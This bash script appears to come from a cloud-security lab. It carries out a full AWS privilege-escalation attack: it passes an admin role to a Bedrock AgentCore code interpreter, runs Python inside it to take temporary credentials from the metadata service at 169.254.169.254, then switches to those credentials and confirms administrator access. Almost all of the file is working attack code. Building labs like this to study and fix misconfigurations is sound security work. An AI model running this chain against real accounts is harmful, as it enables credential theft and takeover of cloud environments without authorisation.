#!/bin/bash

# Demo script for iam:PassRole + Bedrock AgentCore Code Interpreter privilege escalation
# This scenario demonstrates how a user with PassRole and Bedrock AgentCore permissions can
# create a code interpreter with a privileged role and extract credentials from the MicroVM
# Metadata Service (MMDS) at 169.254.169.254 to gain admin access

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-bedrock-001-to-admin-starting-user"
TARGET_ROLE="pl-prod-bedrock-001-to-admin-target-role"
INTERPRETER_NAME="privesc_demo_interpreter"
PYTHON_SCRIPT="/tmp/extract_bedrock_creds.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Bedrock Code Interpreter Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_001_iam_passrole_bedrockagentcore_codeinterpreter.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Check prerequisites
echo -e "${YELLOW}Step 2: Checking prerequisites${NC}"
echo "Verifying required tools are installed..."

# Check for jq
if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed${NC}"
    echo "Please install jq: https://stedolan.github.io/jq/download/"
    exit 1
fi
echo -e "${GREEN}✓ jq is installed${NC}"

# Check for python3
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: python3 is not installed${NC}"
    echo "Please install python3"
    exit 1
fi
echo -e "${GREEN}✓ python3 is installed${NC}"

# Check for boto3
if ! python3 -c "import boto3" &> /dev/null; then
    echo -e "${RED}Error: boto3 is not installed${NC}"
    echo "Please install boto3: pip3 install boto3"
    exit 1
fi
echo -e "${GREEN}✓ boto3 is installed${NC}"
echo ""

# Step 3: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 3: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 4: Get account ID
echo -e "${YELLOW}Step 4: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 6: Create code interpreter with privileged execution role
echo -e "${YELLOW}Step 6: Creating Bedrock code interpreter with admin role${NC}"
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "Interpreter name: $INTERPRETER_NAME"
echo ""
echo "This is the privilege escalation vector - passing the admin role to Bedrock AgentCore..."

INTERPRETER_ID=$(aws bedrock-agentcore-control create-code-interpreter \
    --region $AWS_REGION \
    --name $INTERPRETER_NAME \
    --network-configuration '{"networkMode":"SANDBOX"}' \
    --execution-role-arn $TARGET_ROLE_ARN \
    --query 'codeInterpreterId' \
    --output text)

if [ $? -eq 0 ] && [ -n "$INTERPRETER_ID" ]; then
    echo "Code Interpreter ID: $INTERPRETER_ID"
    echo -e "${GREEN}✓ Successfully created code interpreter with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to create code interpreter${NC}"
    exit 1
fi
echo ""

# Step 7: Wait for code interpreter to initialize
echo -e "${YELLOW}Step 7: Waiting for code interpreter to initialize${NC}"
echo "Allowing time for code interpreter initialization..."
sleep 15
echo -e "${GREEN}✓ Code interpreter ready${NC}\n"

# Step 8: Create Python script to extract credentials from MMDS
echo -e "${YELLOW}Step 8: Creating Python script to extract credentials${NC}"
echo "Creating script that will invoke the code interpreter and extract credentials from MMDS..."

cat > $PYTHON_SCRIPT << 'EOF'
import boto3
import sys
import json

# Get code interpreter ID and region from command line
if len(sys.argv) < 3:
    print("Usage: python3 extract_bedrock_creds.py <interpreter_id> <region>")
    sys.exit(1)

CODE_INTERPRETER_ID = sys.argv[1]
AWS_REGION = sys.argv[2]

# Create Bedrock AgentCore client
bedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=AWS_REGION)

# Start a code interpreter session
print(f"Starting session for code interpreter: {CODE_INTERPRETER_ID}", file=sys.stderr)
session = bedrock_agentcore_client.start_code_interpreter_session(
    codeInterpreterIdentifier=CODE_INTERPRETER_ID,
)
session_id = session['sessionId']
print(f"Session ID: {session_id}", file=sys.stderr)

# Python code to extract credentials from MMDS
# The code interpreter runs in a Firecracker MicroVM with access to MMDS at 169.254.169.254
code = '''import urllib.request
import json

# MicroVM Metadata Service endpoint
IP = "169.254.169.254"

# Get IMDSv2 token
token_request = urllib.request.Request(
    f"http://{IP}/latest/api/token",
    method="PUT",
    headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
)
token = urllib.request.urlopen(token_request).read().decode()

# Get the role name
role_request = urllib.request.Request(
    f"http://{IP}/latest/meta-data/iam/security-credentials/",
    headers={"X-aws-ec2-metadata-token": token}
)
role_name = urllib.request.urlopen(role_request).read().decode().strip()

# Get the credentials
creds_request = urllib.request.Request(
    f"http://{IP}/latest/meta-data/iam/security-credentials/{role_name}",
    headers={"X-aws-ec2-metadata-token": token}
)
credentials = urllib.request.urlopen(creds_request).read().decode()
print(credentials)
'''

# Invoke the code interpreter
print("Invoking code interpreter to extract credentials from MMDS...", file=sys.stderr)
response = bedrock_agentcore_client.invoke_code_interpreter(
    codeInterpreterIdentifier=CODE_INTERPRETER_ID,
    sessionId=session_id,
    name='executeCode',
    arguments={
        'code': code,
        'language': 'python'
    }
)

# Extract stdout from the response stream
for event in response['stream']:
    if 'result' in event:
        if 'structuredContent' in event['result']:
            if 'stdout' in event['result']['structuredContent']:
                stdout = event['result']['structuredContent']['stdout']
                if stdout:
                    # Parse and output the credentials JSON
                    try:
                        creds_json = json.loads(stdout)
                        print(json.dumps(creds_json, indent=2))
                    except json.JSONDecodeError:
                        print(stdout)
EOF

echo -e "${GREEN}✓ Python script created${NC}\n"

# Step 9: Run the Python script to extract credentials
echo -e "${YELLOW}Step 9: Extracting admin credentials from MMDS${NC}"
echo "Running Python script to invoke code interpreter and extract credentials..."
echo "This queries the MicroVM Metadata Service at 169.254.169.254..."
echo ""

# Run the script and capture only stdout (JSON), let stderr print normally for progress
CREDS_JSON=$(python3 $PYTHON_SCRIPT $INTERPRETER_ID $AWS_REGION 2>/dev/null)

if [ $? -ne 0 ] || [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: Failed to extract credentials${NC}"
    echo "Running again with verbose output for debugging:"
    python3 $PYTHON_SCRIPT $INTERPRETER_ID $AWS_REGION
    rm -f $PYTHON_SCRIPT
    exit 1
fi

# Parse credentials (but don't print them)
ADMIN_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId // empty' 2>/dev/null)
ADMIN_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey // empty' 2>/dev/null)
ADMIN_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token // empty' 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Could not parse credentials from MMDS response${NC}"
    echo "Raw JSON output:"
    echo "$CREDS_JSON"
    rm -f $PYTHON_SCRIPT
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted credentials from MMDS${NC}"
echo -e "${GREEN}✓ Parsed AccessKeyId, SecretAccessKey, and SessionToken${NC}\n"

# Step 10: Switch to extracted admin credentials
echo -e "${YELLOW}Step 10: Switching to extracted admin credentials${NC}"
export AWS_ACCESS_KEY_ID=$ADMIN_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$ADMIN_SECRET_KEY
export AWS_SESSION_TOKEN=$ADMIN_SESSION_TOKEN
export AWS_REGION=$AWS_REGION

ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

if [[ $ADMIN_IDENTITY == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}✓ Successfully assumed admin role via extracted credentials${NC}"
else
    echo -e "${YELLOW}⚠ Warning: Identity doesn't match expected role name${NC}"
fi
echo ""

# Step 11: Verify admin access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    rm -f $PYTHON_SCRIPT
    exit 1
fi
echo ""

# Clean up temporary files
rm -f $PYTHON_SCRIPT

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Used iam:PassRole to create Bedrock code interpreter with admin role"
echo "3. Invoked code interpreter to execute Python code"
echo "4. Extracted temporary credentials from MicroVM Metadata Service (MMDS)"
echo "5. Used extracted credentials to assume admin role"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (PassRole + CreateCodeInterpreter)"
echo -e "  → Code Interpreter with $TARGET_ROLE"
echo -e "  → (StartSession + InvokeCodeInterpreter)"
echo -e "  → Extract credentials from MMDS (169.254.169.254)"
echo -e "  → Admin Access"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Code Interpreter: $INTERPRETER_NAME (ID: $INTERPRETER_ID)"
echo "- Execution Role: $TARGET_ROLE"

echo -e "\n${RED}⚠ Warning: The code interpreter is still deployed${NC}"
echo -e "${RED}⚠ Bedrock code interpreters may incur charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
